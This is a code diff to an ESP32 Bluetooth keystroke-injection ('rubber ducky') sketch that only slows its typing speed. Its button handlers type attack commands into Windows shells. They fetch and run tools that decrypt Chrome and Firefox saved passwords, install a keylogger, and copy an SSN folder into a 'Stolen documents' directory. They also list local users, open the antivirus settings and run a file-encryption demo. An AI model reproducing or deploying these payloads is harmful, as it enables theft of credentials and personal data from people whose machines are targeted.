@@ -127,11 +127,11 @@ void loop() {
       bleKeyboard.releaseAll(); delay(2000);
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("sachin", 10); delay(100); 
+      sendString("sachin", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
       openRun(); delay(300); 
-      sendString("notepad"); delay(100); 
+      sendString("notepad", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
       sendString("This is bluetooth usb rubber ducky script is started on your computer system", 10); 
@@ -143,22 +143,22 @@ void loop() {
     if (lastState4 == HIGH && state4 == LOW) {
       Serial.println("Button 4: Decrypt Chrome Passwords (Pin 19)");
       openRun(); delay(300); 
-      sendString("powershell"); delay(100); 
+      sendString("powershell", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(300);
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("cd Desktop", 10); delay(100); 
+      sendString("cd Desktop", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100);
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 10); delay(100); 
+      sendString("git clone https://github.com/ohyicong/decrypt-chrome-passwords.git", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("ls", 10); delay(100); 
+      sendString("ls", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
-      sendString("cd decrypt-chrome-passwords", 10); delay(100); 
+      sendString("cd decrypt-chrome-passwords", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
-      sendString("python decrypt_chrome_password.py", 10); delay(100); 
+      sendString("python decrypt_chrome_password.py", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
       Serial.println("Decrypt Chrome Passwords Payload executed");
@@ -196,7 +196,7 @@ void loop() {
       Serial.println("Button 7: Virus & Threat Protection (Pin 23)");
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("virus & threat protection", 10); delay(1000);
+      sendString("virus & threat protection", 50); delay(1000);
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(2000);
       bleKeyboard.press(KEY_TAB); delay(500); 
@@ -223,22 +223,22 @@ void loop() {
       Serial.println("Button 8: Firefox Decrypt (Pin 25)");
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("powershell", 10); delay(100); 
+      sendString("powershell", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100);
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("cd Desktop", 10); delay(100); 
+      sendString("cd Desktop", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100);
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("git clone https://github.com/unode/firefox_decrypt.git", 10); delay(100); 
+      sendString("git clone https://github.com/unode/firefox_decrypt.git", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd firefox_decrypt", 10); delay(100); 
+      sendString("cd firefox_decrypt", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
-      sendString("python firefox_decrypt.py", 10); delay(100); 
+      sendString("python firefox_decrypt.py", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
-      sendString("2", 10); delay(100); 
+      sendString("2", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
       Serial.println("Firefox Decrypt Payload executed");
@@ -248,13 +248,13 @@ void loop() {
     if (lastState9 == HIGH && state9 == LOW) {
       Serial.println("Button 9: Copy Files Payload (Pin 26)");
       openRun(); delay(1000); 
-      sendString("cmd", 10); delay(100); 
+      sendString("cmd", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1500);
-      sendString("mkdir \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\"", 10); delay(100); 
+      sendString("mkdir \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\"", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("xcopy \"C:\\Users\\Dell\\Documents\\Hello\\SSN\\*\" \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\\\" /E /I /Y", 10); delay(100); 
+      sendString("xcopy \"C:\\Users\\Dell\\Documents\\Hello\\SSN\\*\" \"C:\\Users\\Dell\\Pictures\\Screenshots\\OneDrive\\Desktop\\Stolen documents\\\" /E /I /Y", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
       Serial.println("Copy Files Payload executed");
@@ -264,10 +264,10 @@ void loop() {
     if (lastState10 == HIGH && state10 == LOW) {
       Serial.println("Button 10: Notepad Message + Save (Pin 27)");
       openRun(); delay(1000); 
-      sendString("notepad", 10); delay(100); 
+      sendString("notepad", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("Hello! This is automated typing using BLE HID.", 10); delay(500);
+      sendString("Hello! This is automated typing using BLE HID.", 50); delay(500);
       bleKeyboard.press(KEY_LEFT_ALT); 
       bleKeyboard.press('f'); 
       delay(100); 
@@ -282,13 +282,13 @@ void loop() {
     if (lastState11 == HIGH && state11 == LOW) {
       Serial.println("Button 11: Net User Command (Pin 32)");
       openRun(); delay(1000); 
-      sendString("cmd", 10); delay(100); 
+      sendString("cmd", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(1500);
-      sendString("net user", 10); delay(100); 
+      sendString("net user", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(5000);
-      sendString("exit", 10); delay(100); 
+      sendString("exit", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(500);
       Serial.println("Net User Command Payload executed");
@@ -323,19 +323,19 @@ void loop() {
       Serial.println("Button 14: Keylogger (Pin 12)");
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("powershell", 10); delay(100); 
+      sendString("powershell", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100);
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("cd Desktop", 10); delay(100); 
+      sendString("cd Desktop", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("git clone https://github.com/sachinpandey7709/Keylogger.git", 10); delay(100); 
+      sendString("git clone https://github.com/sachinpandey7709/Keylogger.git", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd Keylogger", 10); delay(100); 
+      sendString("cd Keylogger", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
-      sendString("python keylogger.py", 10); delay(100); 
+      sendString("python keylogger.py", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
       Serial.println("Keylogger Payload executed");
@@ -346,19 +346,19 @@ void loop() {
       Serial.println("Button 15: File Encryption Demo (Pin 13)");
       bleKeyboard.press(KEY_LEFT_GUI); delay(100); 
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("powershell", 10); delay(100); 
+      sendString("powershell", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100);
       bleKeyboard.releaseAll(); delay(1000);
-      sendString("cd Desktop", 10); delay(100); 
+      sendString("cd Desktop", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 10); delay(100); 
+      sendString("git clone https://github.com/sachinpandey7709/File-Encryption-Awareness-Project-Ethical-Demo-.git", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(7000);
-      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 10); delay(100); 
+      sendString("cd File-Encryption-Awareness-Project-Ethical-Demo-", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
-      sendString("python code.py", 10); delay(100); 
+      sendString("python code.py", 50); delay(100); 
       bleKeyboard.press(KEY_RETURN); delay(100); 
       bleKeyboard.releaseAll(); delay(3000);
       Serial.println("File Encryption Demo Payload executed");
@@ -384,3 +384,4 @@ void loop() {
   }
   delay(50); // Debounce/stability
 }
+
